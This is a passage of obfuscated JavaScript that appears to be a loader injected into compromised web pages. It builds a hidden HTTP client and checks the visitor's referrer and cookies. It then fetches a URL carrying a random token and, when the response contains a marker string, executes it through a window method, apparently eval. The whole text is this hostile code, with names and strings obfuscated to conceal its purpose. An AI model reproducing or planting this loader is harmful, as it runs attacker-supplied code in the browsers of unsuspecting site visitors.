_0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};